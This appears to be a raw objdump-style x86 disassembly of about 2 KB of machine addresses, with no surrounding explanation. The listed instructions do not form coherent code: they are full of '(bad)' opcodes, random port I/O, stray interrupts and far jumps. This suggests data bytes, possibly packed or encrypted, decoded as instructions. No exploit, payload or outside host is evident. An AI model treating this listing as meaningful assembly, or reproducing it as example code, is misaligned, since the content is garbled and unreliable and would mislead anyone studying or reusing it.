  42bfc4:	add    DWORD PTR ss:[esi+eiz*1],0x96fcd1b1
  42bfcc:	ror    BYTE PTR [esi],1
  42bfce:	int    0x79
  42bfd0:	and    DWORD PTR [edx],ebp
  42bfd2:	xor    eax,0xb7de78c
  42bfd7:	data16 fcom QWORD PTR [esp+ebx*2-0x425796bd]
  42bfdf:	cmp    DWORD PTR [edx-0x17],edx
  42bfe2:	add    dh,dh
  42bfe4:	add    DWORD PTR [esi],0x98b1b935
  42bfea:	neg    BYTE PTR [eax]
  42bfec:	out    0x30,al
  42bfee:	add    ebx,edx
  42bff0:	xor    al,0x88
  42bff2:	stc    
  42bff3:	jmp    ebp
  42bff5:	sub    DWORD PTR [edi],esp
  42bff7:	mov    eax,ds:0xa63860d8
  42bffc:	jecxz  0x42c05a
  42bffe:	das    
  42bfff:	mov    dh,0x3c
  42c001:	add    ecx,DWORD PTR [eax+edx*8+0x74]
  42c005:	xchg   edi,eax
  42c006:	sbb    DWORD PTR [eax],edx
  42c008:	jb     0x42c00a
  42c00a:	xchg   edx,eax
  42c00b:	call   0x8fe2:0xde6ed917
  42c012:	in     al,dx
  42c013:	sub    esi,DWORD PTR [edx-0x39e4fbf2]
  42c019:	jnp    0x42c08a
  42c01b:	xor    DWORD PTR [edi-0x36f36439],ebp
  42c021:	sbb    eax,0x6b8757c6
  42c026:	mov    ebp,db3
  42c029:	sub    DWORD PTR [edi-0x2a2beccd],esi
  42c02f:	mov    edx,0x31b7382
  42c034:	shl    BYTE PTR [ecx+0x1f],cl
  42c037:	lods   eax,DWORD PTR ds:[esi]
  42c038:	add    DWORD PTR [ebp-0x2b],ecx
  42c03b:	add    al,0x66
  42c03d:	dec    eax
  42c03e:	push   esp
  42c03f:	sbb    ebp,DWORD PTR [edi]
  42c041:	push   ss
  42c042:	and    BYTE PTR [esp],dh
  42c045:	or     eax,0xe8c5d69d
  42c04a:	pop    ebx
  42c04b:	mov    ss,ebx
  42c04d:	ins    BYTE PTR es:[edi],dx
  42c04e:	or     eax,0x97c60194
  42c053:	cdq    
  42c054:	xchg   edx,eax
  42c055:	test   eax,0x544e5034
  42c05a:	pop    es
  42c05b:	dec    eax
  42c05c:	sub    DWORD PTR [edi+0x41],0xc8c68691
  42c063:	xor    DWORD PTR [edx],edx
  42c065:	outs   dx,DWORD PTR gs:[esi]
  42c067:	into   
  42c068:	lods   eax,DWORD PTR ds:[esi]
  42c069:	call   0x0:0x3beb3
	...
  42c0d4:	add    BYTE PTR [eax],al
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	shr    BYTE PTR [ebx+esi*1+0x1d7665d],1
  42c0e9:	add    bh,bh
  42c0eb:	add    BYTE PTR [eax],al
  42c0ed:	add    BYTE PTR [ebx-0x4a],cl
  42c0f0:	es xor al,0xe7
  42c0f3:	add    al,0x66
  42c0f5:	mov    al,ds:0xb93d96ba
  42c0fa:	loopne 0x42c16b
  42c0fc:	xchg   edi,eax
  42c0fd:	adc    BYTE PTR [ebp+0x2198324a],cl
  42c103:	daa    
  42c104:	and    BYTE PTR [ebp-0x62702311],ch
  42c10a:	or     al,0xee
  42c10c:	cs icebp 
  42c10e:	je     0x42c185
  42c110:	lods   eax,DWORD PTR ds:[esi]
  42c111:	icebp  
  42c112:	sbb    al,0xeb
  42c114:	pusha  
  42c115:	pop    esi
  42c116:	sub    dl,dl
  42c118:	inc    DWORD PTR [esi+eiz*1]
  42c11b:	inc    ecx
  42c11c:	mov    ebx,0x1a4435ad
  42c121:	js     0x42c0b5
  42c123:	mov    BYTE PTR [ebx+0x67efe96a],dl
  42c129:	rol    esi,1
  42c12b:	and    al,0xc4
  42c12d:	jns    0x42c141
  42c12f:	cmp    al,0x55
  42c131:	pushf  
  42c132:	and    al,0xe
  42c134:	sbb    eax,0xfd48ff04
  42c139:	test   DWORD PTR [eax+eax*1+0x74b83063],edx
  42c140:	cmp    al,0xc
  42c142:	xor    al,BYTE PTR [ecx+edi*8+0x12ae13f2]
  42c149:	(bad)  
  42c14a:	mov    ax,0xcec0
  42c14e:	out    dx,al
  42c14f:	imul   BYTE PTR ds:0x411413bf
  42c155:	mov    es,esp
  42c157:	retf   
  42c158:	mov    ch,0x6f
  42c15a:	cld    
  42c15b:	aam    0xd0
  42c15d:	imul   esi,DWORD PTR [ebp+eiz*4+0x4b],0x55fdc408
  42c165:	cmc    
  42c166:	loope  0x42c1d4
  42c168:	adc    BYTE PTR [ebx+0x1c],dh
  42c16b:	or     al,0x3a
  42c16d:	imul   esp,ebp,0x4b
  42c170:	jno    0x42c170
  42c172:	dec    esp
  42c173:	leave  
  42c174:	ins    BYTE PTR es:[edi],dx
  42c175:	leave  
  42c176:	add    al,0xde
  42c178:	repnz xchg edi,eax
  42c17a:	and    eax,0x193244bc
  42c17f:	fiadd  DWORD PTR [ebp-0x7a4c9a5f]
  42c185:	adc    DWORD PTR [esi+eiz*2],edx
  42c188:	dec    ecx
  42c189:	inc    edi
  42c18a:	add    edi,DWORD PTR [esi-0x38ea701d]
  42c190:	pop    edx
  42c191:	cmp    eax,0x66792bb1
  42c196:	push   ebp
  42c197:	fstp   DWORD PTR [edx-0x77]
  42c19a:	sub    esp,esp
  42c19c:	int    0x72
  42c19e:	mov    BYTE PTR [ebx+0x66],bl
  42c1a1:	(bad)  
  42c1a2:	dec    edx
  42c1a3:	rol    dl,1
  42c1a5:	or     eax,DWORD PTR [eax-0x77]
  42c1a8:	lock div DWORD PTR [edx]
  42c1ab:	add    ch,0x1c
  42c1ae:	inc    ebx
  42c1af:	push   ds
  42c1b0:	loop   0x42c1f5
  42c1b2:	sub    al,0xf7
  42c1b4:	cmp    eax,0x8f9b8919
  42c1b9:	inc    eax
  42c1ba:	(bad)  
  42c1bb:	jns    0x42c1cc
  42c1bd:	sbb    al,0x5d
  42c1bf:	pop    ebx
  42c1c0:	add    edi,esi
  42c1c2:	sub    al,0x10
  42c1c4:	push   esi
  42c1c5:	xchg   DWORD PTR [esi+0x2a569fa7],edi
  42c1cb:	inc    edx
  42c1cc:	adc    ch,BYTE PTR ss:[ebx+0x56]
  42c1d0:	xchg   DWORD PTR [eax-0x28],edx
  42c1d3:	inc    DWORD PTR [edx-0xe]
  42c1d6:	or     eax,0x27cbcb38
  42c1db:	je     0x42c204
  42c1dd:	ds out dx,eax
  42c1df:	sub    DWORD PTR [edx-0x1a],esp
  42c1e2:	jne    0x42c229
  42c1e4:	cmp    al,0xca
  42c1e6:	imul   edx,ebx,0x6d
  42c1e9:	sub    al,0x90
  42c1eb:	sub    ch,al
	...
  42c255:	add    BYTE PTR [ecx-0x7e],ch
  42c258:	int    0xae
  42c25a:	out    dx,eax
  42c25b:	out    dx,eax
  42c25c:	imul   eax,edi,0xfffffff2
  42c25f:	nop
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	sub    ch,BYTE PTR [ecx]
  42c264:	inc    esp
  42c265:	jnp    0x42c2cc
  42c267:	fadd   DWORD PTR [ecx]
  42c269:	add    bh,bh
  42c26b:	add    BYTE PTR [eax],al
  42c26d:	add    BYTE PTR [edx+0x73596a40],ch
  42c273:	leave  
  42c274:	call   0x9b9ec98e
  42c279:	mov    ebx,ebx
  42c27b:	sub    DWORD PTR [ecx],ebp
  42c27d:	daa    
  42c27e:	daa    
  42c27f:	or     ebp,DWORD PTR [esi-0x7f]
  42c282:	add    bl,BYTE PTR [eax+0x5ee0ee18]
  42c288:	fistp  DWORD PTR [ecx]
  42c28a:	test   eax,0x84f6e6ea
  42c28f:	clc    
  42c290:	add    al,ah
  42c292:	nop
  42c293:	pop    ecx
  42c294:	inc    esi
  42c295:	inc    ebp
  42c296:	push   eax
  42c297:	pop    eax
  42c298:	sahf   
  42c299:	fbstp  TBYTE PTR [edi]
  42c29b:	lods   eax,DWORD PTR ds:[esi]
  42c29c:	inc    ebx
  42c29d:	mov    ds,WORD PTR [esi-0x74]
  42c2a0:	out    dx,eax
  42c2a1:	mov    ah,0x67
  42c2a3:	popf   
  42c2a4:	pop    ebx
  42c2a5:	aas    
  42c2a6:	xor    ch,dh
  42c2a8:	lods   al,BYTE PTR ds:[esi]
  42c2a9:	mov    ds:0x8036746e,al
  42c2ae:	jno    0x42c2a8
  42c2b0:	neg    DWORD PTR [ebx+0x5f038944]
  42c2b6:	add    al,0xbe
  42c2b8:	adc    eax,0x593c6e7
  42c2bd:	imul   ecx,DWORD PTR [edi],0xb9d2a7a8
  42c2c3:	and    BYTE PTR [edi+0x19],bh
  42c2c6:	mov    eax,0xcea9a188
  42c2cb:	in     al,0xa3
  42c2cd:	jp     0x42c2ce
  42c2cf:	sub    DWORD PTR [edx+esi*1],ecx
  42c2d2:	push   ebx
  42c2d3:	xchg   edi,eax
  42c2d4:	imul   edx,DWORD PTR ds:0xedc676ce,0x3
  42c2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2dc:	ret    0x9644
  42c2df:	arpl   sp,ax
  42c2e1:	pop    ds
  42c2e2:	push   ss
  42c2e3:	dec    ebp
  42c2e4:	pop    ebx
  42c2e5:	fcom   DWORD PTR [eax-0x2e]
  42c2e8:	cmp    eax,0xcd9405d9
  42c2ed:	xchg   DWORD PTR [eax+edi*1+0x84dcc3c],edi
  42c2f4:	imul   ebp,DWORD PTR [ecx-0x248a440e],0xffffffea
  42c2fb:	leave  
  42c2fc:	and    al,BYTE PTR [edi-0x84ac397]
  42c302:	add    al,0x3c
  42c304:	xchg   DWORD PTR [edx+eiz*4-0x40],edi
  42c308:	cld    
  42c309:	aam    0x2e
  42c30b:	(bad)  
  42c30c:	arpl   di,ax
  42c30e:	rol    DWORD PTR [ecx],cl
  42c310:	(bad)  
  42c311:	bound  esp,QWORD PTR [edi]
  42c313:	std    
  42c314:	push   cs
  42c315:	out    0x39,eax
  42c317:	loope  0x42c348
  42c319:	lock jb 0x42c308
  42c31c:	jne    0x42c2b1
  42c31e:	arpl   WORD PTR [edi],bx
  42c320:	sti    
  42c321:	xchg   BYTE PTR [ebx+0x71],al
  42c324:	xchg   ecx,eax
  42c325:	and    al,0xf3
  42c327:	test   DWORD PTR [edx],esi
  42c329:	fidiv  WORD PTR [ebx-0x4549bca2]
  42c32f:	test   eax,0xf79c365
  42c334:	imul   edx,DWORD PTR [eax+0x4e],0x95885e6a
  42c33b:	sbb    eax,DWORD PTR [esi-0x4d]
  42c33e:	sahf   
  42c33f:	and    eax,0x182294cd
  42c344:	jge    0x42c359
  42c346:	push   ds
  42c347:	inc    ebp
  42c348:	xlat   BYTE PTR ds:[ebx]
  42c349:	push   cs
  42c34a:	and    DWORD PTR [ebx],ecx
  42c34c:	shr    BYTE PTR [ebx-0x3b],0x7e
  42c350:	sub    BYTE PTR [ecx],cl
  42c352:	mov    bl,BYTE PTR [esi-0x7f]
  42c355:	sahf   
  42c356:	push   ds
  42c357:	mov    bl,0xc6
  42c359:	pusha  
  42c35a:	inc    ebx
  42c35b:	sub    cl,BYTE PTR [edx]
  42c35d:	in     al,dx
  42c35e:	mov    bh,0x26
  42c360:	mov    al,BYTE PTR [ecx-0x18246393]
  42c366:	outs   dx,DWORD PTR ds:[esi]
  42c367:	pop    esi
  42c368:	sbb    ch,BYTE PTR [ebx]
  42c36a:	mov    edi,0xf9f0
	...
  42c3d3:	add    BYTE PTR [eax],al
  42c3d5:	add    dh,ah
  42c3d7:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x9e4da9f6
  42c3e5:	xchg   edi,eax
  42c3e6:	fld    DWORD PTR fs:[ecx]
  42c3e9:	add    bh,bh
  42c3eb:	add    BYTE PTR [eax],al
  42c3ed:	add    BYTE PTR [eax],cl
  42c3ef:	test   al,0x17
  42c3f1:	push   es
  42c3f2:	pop    edx
  42c3f3:	push   ebx
  42c3f4:	outs   dx,DWORD PTR ds:[esi]
  42c3f5:	adc    dl,ch
  42c3f7:	dec    edi
  42c3f8:	inc    esi
  42c3f9:	not    al
  42c3fb:	mov    eax,ds:0xfe0b714c
  42c400:	in     al,0x9d
  42c402:	cmp    cl,BYTE PTR [ebx+0x20]
  42c405:	shl    DWORD PTR [eax+0x56],0xf3
  42c409:	pop    ecx
  42c40a:	mov    WORD PTR [edi],fs
  42c40c:	mov    ecx,0x2d074c10
  42c411:	cmp    ebx,DWORD PTR [eax+0x59b008e6]
  42c417:	test   al,al
  42c419:	popf   
  42c41a:	fsubr  QWORD PTR [eax-0x5e7a5d99]
  42c420:	fs and al,0x7d
  42c423:	ins    DWORD PTR es:[edi],dx
  42c424:	popa   
  42c425:	jns    0x42c430
  42c427:	imul   dx,bp,0x37
  42c42b:	jns    0x42c3f1
  42c42d:	(bad)  
  42c42e:	je     0x42c411
  42c430:	fimul  DWORD PTR [eax+0x4f84d09]
  42c436:	mov    cl,0x65
  42c438:	pop    edx
  42c439:	shl    bl,1
  42c43b:	nop
  42c43c:	mov    edi,0x6c832482
  42c441:	cli    
  42c442:	std    
  42c443:	ret    0x6c4c
  42c446:	inc    ebx
  42c447:	ja     0x42c480
  42c449:	(bad)  
  42c44a:	(bad)
  42c44d:	mov    WORD PTR [ecx-0x6a042a89],fs
  42c453:	cld    
  42c454:	fcomp  QWORD PTR [esi-0x30]
  42c457:	mov    ds:0xe5cb9a91,al
  42c45c:	(bad)  
  42c45d:	jp     0x42c416
  42c45f:	sbb    dl,ah
  42c461:	add    BYTE PTR [esi],dh
  42c463:	pop    esi
  42c464:	ins    DWORD PTR es:[edi],dx
  42c465:	push   esp
  42c466:	cmp    eax,0x6ceba4f0
  42c46b:	jo     0x42c471
  42c46d:	int    0x96
  42c46f:	imul   edi,DWORD PTR [ebx],0xffffff9b
  42c472:	nop
  42c473:	pop    ebp
  42c474:	call   0x4c55a3fa
  42c479:	dec    eax
  42c47a:	cmp    ecx,DWORD PTR [edi-0x173ea010]
  42c480:	jae    0x42c494
  42c482:	mul    DWORD PTR [eax]
  42c484:	and    dh,bl
  42c486:	and    BYTE PTR [esi+0x37cc2ab6],bl
  42c48c:	and    ebp,0xffffffad
  42c48f:	ds jbe 0x42c481
  42c492:	xchg   DWORD PTR [ebp-0x57b77905],esi
  42c498:	jns    0x42c4c3
  42c49a:	pop    edx
  42c49b:	scas   al,BYTE PTR es:[edi]
  42c49c:	push   ebp
  42c49d:	rcl    BYTE PTR [esi+0x32],0x8a
  42c4a1:	hlt    
  42c4a2:	mov    eax,ds:0x1f159631
  42c4a7:	pop    eax
  42c4a8:	sub    eax,0x5baaf111
  42c4ad:	shl    DWORD PTR [ebx],0x4c
  42c4b0:	and    al,0xc9
  42c4b2:	sub    BYTE PTR [edi-0x70],0x5d
  42c4b6:	mov    bh,ch
  42c4b8:	fild   DWORD PTR ds:0x8b530a5f
  42c4be:	jbe    0x42c473
  42c4c0:	in     eax,dx
  42c4c1:	rol    edx,cl
  42c4c3:	push   es
  42c4c4:	mov    dh,BYTE PTR [esi+0x32]
  42c4c7:	jle    0x42c4c7
  42c4c9:	aaa    
  42c4ca:	sub    eax,0xaf1c1225
  42c4cf:	adc    DWORD PTR [eax-0x197a8200],esi
  42c4d5:	gs inc edx
  42c4d7:	stos   DWORD PTR es:[edi],eax
  42c4d8:	add    eax,0x6ccc8904
  42c4dd:	dec    ebp
  42c4de:	mov    edi,DWORD PTR cs:[ebp-0x30]
  42c4e2:	in     al,0xc8
  42c4e4:	lea    edi,[edi+0x4d]
  42c4e7:	sbb    BYTE PTR [ebx+0x156ebc7f],0x0
	...
  42c556:	in     al,dx
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0x1034,0x63
  42c564:	or     eax,0x1da637f
  42c569:	add    bh,bh
  42c56b:	add    BYTE PTR [eax],al
  42c56d:	add    BYTE PTR [edi+0x7a],ch
  42c570:	ror    DWORD PTR [ecx],1
  42c572:	(bad)  
  42c573:	stc    
  42c574:	xchg   ebp,eax
  42c575:	xchg   edx,eax
  42c576:	pusha  
  42c577:	push   ecx
  42c578:	std    
  42c579:	pop    es
  42c57a:	cmp    esp,eax
  42c57c:	push   ss
  42c57d:	mov    dh,0x90
  42c57f:	scas   eax,DWORD PTR es:[edi]
  42c580:	popf   
  42c581:	sub    ch,cl
  42c583:	adc    DWORD PTR [edx],edx
  42c585:	loopne 0x42c56e
  42c587:	shl    DWORD PTR [edi+eax*8-0x18],1
  42c58b:	adc    al,0x54
  42c58d:	xor    DWORD PTR [ecx+0x7218bb],0x9
  42c594:	jae    0x42c540
  42c596:	inc    edx
  42c597:	dec    edi
  42c598:	ror    DWORD PTR ds:[ebx-0x792db836],cl
  42c59f:	out    dx,al
  42c5a0:	xchg   DWORD PTR [esi],eax
  42c5a2:	pop    esi
  42c5a3:	in     al,0xeb
  42c5a5:	call   0x41b9:0x530008e6
  42c5ac:	dec    ebp
  42c5ad:	fistp  WORD PTR [eax]
  42c5af:	add    al,0xc
  42c5b1:	jns    0x42c561
  42c5b3:	or     edi,eax
  42c5b5:	pop    ebp
  42c5b6:	inc    esp
  42c5b7:	(bad)  
  42c5b8:	jns    0x42c55d
  42c5ba:	pop    esp
  42c5bb:	ds mov edx,0x288a77ab
  42c5c1:	jno    0x42c5fd
  42c5c3:	stos   DWORD PTR es:[edi],eax
  42c5c4:	pop    ebx
  42c5c5:	mov    eax,0xfce43ea7
  42c5ca:	test   eax,0x6d97747b
  42c5cf:	cmp    al,0xee
  42c5d1:	xchg   ecx,eax
  42c5d2:	xchg   esp,eax
  42c5d3:	adc    ah,BYTE PTR [ecx]
  42c5d5:	(bad)  
  42c5d6:	cmp    al,0xf5
  42c5d8:	leave  
  42c5d9:	retf   
  42c5da:	cmp    BYTE PTR [ecx+0x1e1ffc16],dh
  42c5e0:	test   DWORD PTR [edx],0xc7a1d21c
  42c5e6:	cli    
  42c5e7:	sahf   
  42c5e8:	sbb    DWORD PTR [ebx],ebp
  42c5ea:	int3   
  42c5eb:	out    0x42,al
  42c5ed:	fisubr WORD PTR [ebp+0x743bd2e6]
  42c5f3:	neg    DWORD PTR [esp+ecx*8-0x5ef52f0e]
  42c5fa:	test   eax,0x4f667f95
  42c5ff:	mov    ebp,0xac387bd8
  42c604:	adc    al,0x45
  42c606:	pop    esi
  42c607:	fcom   QWORD PTR [eax+ebx*1+0x6b]
  42c60b:	jno    0x42c687
  42c60d:	dec    edx
  42c60e:	mov    cl,0x9e
  42c610:	mov    ds:0x86432e3a,eax
  42c615:	sti    
  42c616:	outs   dx,DWORD PTR ds:[esi]
  42c617:	pop    ds
  42c618:	adc    dh,BYTE PTR [edi]
  42c61a:	xor    al,0x65
  42c61c:	dec    DWORD PTR [edx]
  42c61e:	xchg   BYTE PTR [edi],cl
  42c620:	push   ecx
  42c621:	push   cs
  42c622:	in     al,dx
  42c623:	outs   dx,BYTE PTR ds:[esi]
  42c624:	imul   edx,DWORD PTR [eax],0x71
  42c627:	fstp   QWORD PTR [esi]
  42c629:	addr16 jb 0x42c658
  42c62c:	mov    dh,0xef
  42c62e:	jb     0x42c659
  42c630:	daa    
  42c631:	(bad)  
  42c632:	and    DWORD PTR [edi+0x25],esp
  42c635:	xor    al,0xec
  42c637:	imul   DWORD PTR [ecx+0x5]
  42c63a:	sub    al,0xc0
  42c63c:	push   edx
  42c63d:	xchg   esi,eax
  42c63e:	mov    esp,0x68300a0c
  42c643:	das    
  42c644:	inc    ebx
  42c645:	sti    
  42c646:	jb     0x42c661
  42c648:	xor    DWORD PTR [eax-0x1085786b],edx
  42c64e:	adc    eax,0xf632c432
  42c653:	pushf  
  42c654:	neg    BYTE PTR [ebx-0xfcbd47f]
  42c65a:	test   DWORD PTR [eax-0x248ce2e4],edx
  42c660:	xchg   edx,eax
  42c661:	fisttp DWORD PTR [eax-0x34]
  42c664:	cmp    eax,0x30a8c977
  42c669:	je     0x42c63a
  42c66b:	arpl   WORD PTR [edx],sp
	...
  42c6d5:	add    BYTE PTR [ebp+0x48],bl
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x26dfc6b]
  42c6e3:	sub    ch,BYTE PTR [eax]
  42c6e5:	mov    ch,0x62
  42c6e7:	fild   DWORD PTR [ecx]
  42c6e9:	add    bh,bh
  42c6eb:	add    BYTE PTR [eax],al
  42c6ed:	add    BYTE PTR [edi+0x8bf2694],ch
  42c6f3:	std    
  42c6f4:	enter  0xc0bd,0x76
  42c6f8:	cmp    eax,0x610adf64
  42c6fd:	stos   BYTE PTR es:[edi],al
  42c6fe:	and    DWORD PTR [edx],eax
  42c700:	pusha  
  42c701:	adc    eax,0x97fb9d46
  42c706:	dec    edi
  42c707:	cmp    eax,0xd9e2266
  42c70c:	mov    esi,edi
  42c70e:	sbb    eax,0x43196a69
  42c713:	popa   
  42c714:	inc    ebp
  42c715:	mov    esi,ss
  42c717:	sbb    al,0xae
  42c719:	out    dx,eax
  42c71a:	jmp    0x42c729
  42c71c:	and    ah,BYTE PTR [edx-0x1015c708]
  42c722:	fxch   st(0)
  42c724:	shl    DWORD PTR [esi-0x6a],1
  42c727:	shl    DWORD PTR [edi],1
  42c729:	stos   DWORD PTR es:[edi],eax
  42c72a:	adc    bh,BYTE PTR [edi+esi*4-0x2e]
  42c72e:	pop    esp
  42c72f:	mov    esi,DWORD PTR [edx-0x17]
  42c732:	rol    BYTE PTR [edi-0xb478e90],0x6a
  42c739:	ins    DWORD PTR es:[edi],dx
  42c73a:	fwait
  42c73b:	push   ebx
  42c73c:	mov    ebx,0x75367939
  42c741:	sub    DWORD PTR [esp+edi*1+0x5b],esi
  42c745:	jo     0x42c6f0
  42c747:	add    al,BYTE PTR [ebp+eiz*4-0x284240bd]
  42c74e:	jns    0x42c76c
  42c750:	dec    edx
  42c751:	dec    edx
  42c752:	sub    BYTE PTR [edi],ch
  42c754:	lock (bad) 
  42c756:	cmp    DWORD PTR [edi+eiz*4-0xf41f7ff],esi
  42c75d:	scas   eax,DWORD PTR es:[edi]
  42c75e:	out    dx,eax
  42c75f:	out    dx,eax
  42c760:	pop    esi
  42c761:	fsub   QWORD PTR cs:[ecx+0x3f]
  42c765:	pop    ds
  42c766:	xor    al,0xf3
  42c768:	cmp    al,0x25
  42c76a:	mov    ds:0x9f5ecadd,al
  42c76f:	sbb    BYTE PTR [ebp-0x7d],dl
  42c772:	or     bl,ah
  42c774:	adc    DWORD PTR [edi],eax
  42c776:	add    bl,BYTE PTR [edx]
  42c778:	fisttp DWORD PTR [eax]
  42c77a:	jg     0x42c6fd
  42c77c:	mov    ecx,0x5691b74b
  42c781:	push   edi
  42c782:	outs   dx,DWORD PTR ds:[esi]
  42c783:	xchg   ebx,eax
  42c784:	das    
  42c785:	ss cld 
  42c787:	mov    al,ds:0x5954aa2a
  42c78c:	ret    
  42c78d:	jne    0x42c7c1
  42c78f:	or     ecx,ebx
  42c791:	out    dx,eax
  42c792:	xchg   ebp,eax
  42c793:	sub    eax,ebx
  42c795:	add    al,0x9a
  42c797:	jge    0x42c71a
  42c799:	and    DWORD PTR [esi+0x32db62c3],eax
  42c79f:	mov    ds:0xf937379f,al
  42c7a4:	push   es
  42c7a5:	test   eax,0x45210917
  42c7aa:	in     al,dx
  42c7ab:	adc    ebp,DWORD PTR [edx]
  42c7ad:	inc    edx
  42c7ae:	sbb    ecx,edi
  42c7b0:	dec    edx
  42c7b1:	(bad)  
  42c7b2:	and    eax,0x2b62f490
  42c7b7:	jne    0x42c769
  42c7b9:	neg    DWORD PTR [edi+ecx*4-0x31be2c85]
  42c7c0:	and    eax,0x2fb68a19
  42c7c5:	gs inc ebx
  42c7c7:	or     al,0xdf
  42c7c9:	repnz xor bl,BYTE PTR [ecx+0xb]
  42c7cd:	xchg   ebx,eax
  42c7ce:	sbb    BYTE PTR [eax+0x5e],0xc8
  42c7d2:	out    dx,al
  42c7d3:	in     eax,dx
  42c7d4:	push   0x9499b35e
  42c7d9:	pushf  
  42c7da:	xchg   edx,eax
  42c7db:	sbb    al,0x11
  42c7dd:	push   0x38
  42c7df:	loopne 0x42c7ea
  42c7e1:	dec    ebx
  42c7e2:	or     BYTE PTR [ecx-0x74],0xb2
  42c7e6:	push   ebp
  42c7e7:	js     0x42c786
  42c7e9:	jge    0x42c7cb
  42c7eb:	inc    esp
  42c7ec:	or     al,BYTE PTR [eax]
	...
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	xor    DWORD PTR [edi+ebx*1-0x26],esp
  42c866:	popa   
  42c867:	fadd   QWORD PTR [ecx]
  42c869:	add    bh,bh
  42c86b:	add    BYTE PTR [eax],al
  42c86d:	add    BYTE PTR [ecx+0x7c],al
  42c870:	adc    esp,DWORD PTR [eax-0x46]
  42c873:	push   edi
  42c874:	popf   
  42c875:	mov    ds:0x77e648a7,eax
  42c87a:	xchg   BYTE PTR [esi+0x572812ba],ah
  42c880:	jmp    0x247fc00a
  42c885:	retf   
  42c886:	rcr    ch,cl
  42c888:	cmp    al,0xaf
  42c88a:	cmp    eax,0x97b64a05
  42c88f:	adc    DWORD PTR [eax-0x37],ebx
  42c892:	outs   dx,BYTE PTR ds:[esi]
  42c893:	mov    edx,DWORD PTR [ecx-0x77aaf9a8]
  42c899:	fs mov bl,ch
  42c89c:	ins    BYTE PTR es:[edi],dx
  42c89d:	jmp    0x42c8c4
  42c89f:	xchg   BYTE PTR [ebx],dl
  42c8a1:	es leave 
  42c8a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8a4:	bound  ebp,QWORD PTR ds:[eax-0x49]
  42c8a8:	outs   dx,DWORD PTR ds:[esi]
  42c8a9:	loopne 0x42c8c8
  42c8ab:	mov    eax,0xf72201b3
  42c8b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8b1:	mov    edx,0x8f6c0148
  42c8b6:	cmp    al,0xb6
  42c8b8:	xchg   edi,eax
  42c8b9:	xor    ch,BYTE PTR [ebx+0x4d0c2b40]
  42c8bf:	mov    bl,BYTE PTR [ecx-0x2600feb9]
  42c8c5:	xchg   esi,eax
  42c8c6:	xchg   esi,eax
  42c8c7:	xchg   DWORD PTR [eax],esp
  42c8c9:	dec    esp
  42c8ca:	or     al,0x24
  42c8cc:	sti    
  42c8cd:	imul   ecx,edx,0xfffffff8
  42c8d0:	pop    ss
  42c8d1:	xor    eax,0xe85533fd
  42c8d6:	data16 je 0x42c859
  42c8d9:	ins    DWORD PTR es:[edi],dx
  42c8da:	in     eax,dx
  42c8db:	dec    edi
  42c8dc:	popf   
  42c8dd:	xor    bl,BYTE PTR [edx+0x53a4ebf]
  42c8e3:	lods   al,BYTE PTR ds:[esi]
  42c8e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8e5:	inc    edx
  42c8e6:	into   
  42c8e7:	(bad)  
  42c8e9:	pop    esp
  42c8ea:	cmc    
  42c8eb:	cli    
  42c8ec:	daa    
  42c8ed:	and    al,0xdd
  42c8ef:	mov    cl,BYTE PTR [esi+0x4ad63ee1]
  42c8f5:	bound  eax,QWORD PTR [edi]
  42c8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8f8:	push   es
  42c8f9:	mov    ch,0xda
  42c8fb:	sub    DWORD PTR [esp+esi*4+0x3b2e6c29],edi
  42c902:	dec    ecx
  42c903:	mov    ds:0x799028f7,al
  42c908:	bound  ecx,QWORD PTR [ecx+esi*1+0x63]
  42c90c:	unpcklps xmm6,xmm6
  42c90f:	pop    esi
  42c910:	pop    esp
  42c911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c912:	stos   DWORD PTR es:[edi],eax
  42c913:	cmp    al,0x49
  42c915:	js     0x42c980
  42c917:	std    
  42c918:	ss rcl bl,0x18
  42c91c:	xchg   eax,ebp
  42c91e:	pop    ebp
  42c91f:	adc    bl,BYTE PTR [esi]
  42c921:	outs   dx,DWORD PTR ds:[esi]
  42c922:	push   edi
  42c923:	cmc    
  42c924:	mov    esi,0xdef45568
  42c929:	cld    
  42c92a:	push   es
  42c92b:	pop    ds
  42c92c:	and    bh,BYTE PTR [edi-0x2708eec7]
  42c932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c933:	mov    dl,0xf8
  42c935:	dec    ebp
  42c936:	out    0x31,eax
  42c938:	sbb    eax,0xaeb57b46
  42c93d:	ja     0x42c8e7
  42c93f:	aam    0x3e
  42c941:	inc    edx
  42c942:	dec    ecx
  42c943:	sti    
  42c944:	daa    
  42c945:	retf   0x256f
  42c948:	push   edi
  42c949:	jae    0x42c98a
  42c94b:	jmp    0x8969f639
  42c950:	mov    dh,0xe4
  42c952:	and    eax,0xbedb5d02
  42c957:	inc    eax
  42c958:	mov    BYTE PTR [edi-0x23],bl
  42c95b:	dec    esp
  42c95c:	inc    ecx
  42c95d:	xchg   esi,eax
  42c95e:	sti    
  42c95f:	pop    esp
  42c960:	fisub  DWORD PTR [edi]
  42c962:	outs   dx,BYTE PTR ds:[esi]
  42c963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c964:	adc    al,0x2d
  42c966:	pop    es
  42c967:	or     DWORD PTR [ebx],ebp
  42c969:	loop   0x42c953
  42c96b:	jl     0x42c96f
	...
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
